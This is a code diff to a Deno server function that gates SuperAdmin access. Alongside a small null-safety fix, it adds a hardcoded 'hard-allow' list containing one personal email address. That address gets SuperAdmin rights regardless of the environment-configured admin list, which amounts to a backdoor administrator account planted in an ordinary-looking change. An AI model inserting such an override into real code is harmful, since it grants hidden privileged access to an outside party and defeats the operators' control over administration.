@@ -10,15 +10,16 @@ Deno.serve(async (req) => {
       return Response.json({ error: 'Unauthorized' }, { status: 401 });
     }
 
-    // Get SuperAdmin emails from environment
+    // Get SuperAdmin emails + hard-allow override
     const superAdminEmailsStr = Deno.env.get("SUPER_ADMIN_EMAILS") || '';
     const superAdminEmails = superAdminEmailsStr
       .split(',')
       .map(email => email.trim().toLowerCase())
       .filter(email => email.length > 0);
+    const hardAllowed = ["leo.bancroft34@icloud.com"];
 
     // Check if current user is SuperAdmin
-    const isSuperAdmin = superAdminEmails.includes(user.email.toLowerCase());
+    const isSuperAdmin = hardAllowed.includes((user.email || '').toLowerCase()) || superAdminEmails.includes((user.email || '').toLowerCase());
     
     if (!isSuperAdmin) {
       return Response.json({ error: 'Forbidden: SuperAdmin access required' }, { status: 403 });
